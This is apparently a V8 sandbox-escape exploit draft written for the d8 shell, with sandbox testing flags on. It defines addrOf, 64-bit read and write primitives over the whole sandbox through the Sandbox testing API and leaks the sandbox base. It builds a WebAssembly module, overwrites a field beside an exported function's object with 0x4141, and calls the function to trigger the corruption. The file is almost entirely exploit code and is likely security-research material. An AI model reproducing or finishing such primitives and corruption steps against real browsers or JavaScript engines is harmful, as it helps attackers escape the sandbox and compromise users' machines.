
// r --expose-gc --allow-natives-syntax --sandbox-testing --experimental-wasm-memory64 ~/v8_sb_fuzz/sandbox_fuzzer/stack_oob.js

d8.file.execute('/home/vult/v8_sb_fuzz/v8/test/mjsunit/wasm/wasm-module-builder.js');
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }

console.log("[*] Leak sandbox base address");
// ================= reading heap_base =============================
let heap_addr = BigInt(Sandbox.base);
console.log("heap_addr: 0x" + heap_addr.toString(16));
let target_page = BigInt(Sandbox.targetPage);
console.log("target_page: 0x" + target_page.toString(16));
// ================================================================

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);

builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
  kExprI64Mul,
]);


let instance = builder.instantiate();
instance.exports.func1(0n);

// ===============================
%SystemBreak();
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4141n);

// trigger
instance.exports.func1(0x4141n);